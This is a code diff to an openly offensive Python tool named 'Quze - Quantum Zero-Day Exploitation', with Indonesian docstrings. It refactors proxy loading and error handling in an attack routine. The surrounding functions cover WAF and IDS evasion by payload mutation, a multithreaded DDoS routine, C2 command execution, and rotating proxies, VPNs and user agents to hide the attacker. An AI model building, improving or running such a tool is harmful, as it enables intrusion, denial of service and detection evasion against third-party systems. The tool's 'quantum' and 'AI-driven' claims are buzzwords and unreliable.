@@ -621,7 +621,6 @@ def evade_multi_layers(payload):
     logging.info(f"[*] Quantum Multi-Layer Evasive Payload generated: {cloaked_payload[:50]}...")
     return cloaked_payload
 
-
 def evasive_payload(payload):
     """Menghasilkan payload adaptif yang bisa bermutasi sendiri menggunakan AI dan Quantum Reinforcement Learning."""
     evasive_payload = ai_payload_mutation(load_ml_model(), payload)
@@ -636,7 +635,6 @@ def evasive_payload(payload):
 
     logging.info(f"[*] Evasive Quantum Payload generated: {evasive_payload[:50]}...")
     return evasive_payload
-
 
 def quantum_attack_simulation(target, payload, attack_type="adaptive"):
     """Simulasi serangan quantum dengan payload otomatis yang bisa beradaptasi terhadap target."""
@@ -662,7 +660,6 @@ def quantum_attack_simulation(target, payload, attack_type="adaptive"):
 
     print(f"[{'+' if response.status_code == 200 else '-'}] Quantum attack {'successful' if response.status_code == 200 else 'failed'} on {target}. Response Code: {response.status_code}")
 
-
 def autonomous_feedback_loop(target, payload, max_attempts=10):
     """Loop otomatis dengan AI-adaptive mutation, Quantum Feedback Analysis, dan Machine Learning."""
     for attempt in range(max_attempts):
@@ -686,7 +683,6 @@ def autonomous_feedback_loop(target, payload, max_attempts=10):
             time.sleep(random.uniform(1.5, 5))  # Randomized delay untuk menghindari deteksi WAF
 
     return response.status_code
-
 
 def simulate_evasive_payload(target):
     """Menguji payload evasif dengan AI-driven obfuscation dan multi-layer WAF evasion."""
@@ -726,7 +722,6 @@ def network_exploitation(target, payload):
     print(f"[{'+' if response.status_code == 200 else '-'}] Quantum Network Exploitation {'successful' if response.status_code == 200 else 'failed'} on {target}.")
     return response.status_code
 
-
 def quantum_ddos_attack(target, duration=120, threads=200):
     """Melakukan Quantum DDoS Attack dengan teknik Quantum Randomized Payload Injection."""
     print(f"[*] Initiating Quantum DDoS on {target} for {duration} seconds...")
@@ -745,7 +740,6 @@ def quantum_ddos_attack(target, duration=120, threads=200):
 
     return "[+] Quantum DDoS attack executed successfully."
 
-
 def self_healing_attack_automation(targets, payload, attack_type="quantum-adaptive"):
     """Menggunakan AI-driven self-healing attacks dengan mekanisme Quantum Superposition."""
     print("[*] Initiating AI-driven self-healing attack automation...")
@@ -754,7 +748,6 @@ def self_healing_attack_automation(targets, payload, attack_type="quantum-adapti
         for target in targets:
             payload = self_healing_quantum_payload(payload)
             executor.submit(autonomous_feedback_loop, target, payload, attack_type)
-
 
 def quantum_penetration_test(targets, payloads, max_attempts=15):
     """Pengujian penetrasi berbasis Quantum AI yang menggunakan multi-layer adaptive attacks."""
@@ -770,14 +763,12 @@ def quantum_penetration_test(targets, payloads, max_attempts=15):
 
     return results
 
-
 def quantum_data_integrity_check(data):
     """Menggunakan Quantum Hashing untuk memastikan integritas data."""
     print("[*] Performing Quantum Data Integrity Check...")
     hashed_data = hashlib.sha3_512(data.encode()).hexdigest()
     print(f"[+] Quantum Data Integrity Check Result: {hashed_data}")
     return hashed_data
-
 
 def quantum_multi_layer_evasion(payload):
     """Menggunakan Quantum Multi-Layer Evasion untuk menghindari deteksi WAF dan IDS."""
@@ -786,7 +777,6 @@ def quantum_multi_layer_evasion(payload):
     evasive_payload = evasive_payload_transformation(evasive_payload)
     evasive_payload = self_healing_quantum_payload(evasive_payload)
     return evasive_payload
-
 
 def quantum_c2_command_execution(command, targets):
     """Melakukan eksekusi perintah C2 dengan Quantum Encryption dan AI-driven Obfuscation."""
@@ -807,7 +797,6 @@ def quantum_c2_command_execution(command, targets):
 
     return results
 
-
 def advanced_quantum_penetration(target):
     """Melakukan uji penetrasi canggih berbasis Quantum Superposition Attack."""
     print("[*] Starting Advanced Quantum Penetration Testing...")
@@ -823,14 +812,24 @@ def advanced_quantum_penetration(target):
         print(f"[-] Quantum Penetration Test failed. Status Code: {response.status_code}")
         return False
 
-
-def setup_proxy():
-    """Menggunakan daftar proxy secara acak untuk menyembunyikan identitas pengguna."""
-    proxies = []
-    with open('proxies.txt', 'r') as proxy_file:
-        proxies = proxy_file.readlines()
+def load_proxies(proxy_file):
+    """Membaca file proxy yang diberikan user dan mengembalikan daftar proxy."""
+    try:
+        with open(proxy_file, 'r') as f:
+            proxies = [line.strip() for line in f.readlines() if line.strip()]
+        if not proxies:
+            print("[-] Tidak ada proxy valid di file.")
+        return proxies
+    except FileNotFoundError:
+        print(f"[-] File {proxy_file} tidak ditemukan.")
+        return []
+        
+def setup_proxy(proxy_file):
+    """Menggunakan daftar proxy dari file yang diberikan user."""
+    proxies = load_proxies(proxy_file)
     if proxies:
-        return {"http": random.choice(proxies).strip(), "https": random.choice(proxies).strip()}
+        chosen_proxy = random.choice(proxies)
+        return {"http": chosen_proxy, "https": chosen_proxy}
     return None
 
 
@@ -843,10 +842,10 @@ def setup_vpn():
     print("[-] No VPN address found in environment variables.")
     return None
 
-def attack_execution(target, payload):
+def attack_execution(target, payload, proxy_file=None):
     print(f"[*] Starting attack execution on {target} with the payload...")
     vpn = setup_vpn()
-    proxy = setup_proxy()
+    proxy = setup_proxy(proxy_file) if proxy_file else None
 
     headers = {
         "User-Agent": random.choice(open('user_agents.txt').readlines()).strip(),
@@ -854,33 +853,39 @@ def attack_execution(target, payload):
     }
     
     if vpn:
-        # Placeholder for VPN configuration if applicable
         print(f"[*] Using VPN connection: {vpn}")
     
     if proxy:
         print(f"[*] Using proxy: {proxy['http']}")
-        response = requests.get(f"http://{target}/admin", headers=headers, proxies=proxy)
     else:
-        response = requests.get(f"http://{target}/admin", headers=headers)
-    
-    if response.status_code == 200:
-        attack_result = f"[+] Attack successful on {target}!"
-        print(attack_result)
-    else:
-        attack_result = f"[-] Attack failed with status code: {response.status_code}"
-        print(attack_result)
-    
-    evasive_payload = evasive_payload(payload)
-    response = requests.get(f"http://{target}/admin", headers=headers, proxies=proxy, params={'input': evasive_payload})
-    
-    if response.status_code == 200:
-        evasive_result = "[+] Evaded detection, attack successful!"
-        print(evasive_result)
-    else:
-        evasive_result = f"[-] Attack failed after evasion attempt. Status: {response.status_code}"
-        print(evasive_result)
+        print("[*] No proxy used for this attack.")
 
-    return attack_result, evasive_result  
+    try:
+        response = requests.get(f"http://{target}/admin", headers=headers, proxies=proxy, timeout=10)
+        if response.status_code == 200:
+            attack_result = f"[+] Attack successful on {target}!"
+        else:
+            attack_result = f"[-] Attack failed with status code: {response.status_code}"
+    except requests.RequestException as e:
+        attack_result = f"[-] Attack request failed: {e}"
+
+    print(attack_result)
+
+    # Generate evasive payload
+    evasive_payload_data = evasive_payload(payload)
+    
+    try:
+        evasive_response = requests.get(f"http://{target}/admin", headers=headers, proxies=proxy, params={'input': evasive_payload_data}, timeout=10)
+        if evasive_response.status_code == 200:
+            evasive_result = "[+] Evaded detection, attack successful!"
+        else:
+            evasive_result = f"[-] Attack failed after evasion attempt. Status: {evasive_response.status_code}"
+    except requests.RequestException as e:
+        evasive_result = f"[-] Evasive attack request failed: {e}"
+
+    print(evasive_result)
+
+    return attack_result, evasive_result
 
 def main():
     parser = argparse.ArgumentParser(description="Quze - Quantum Zero-Day Exploitation")
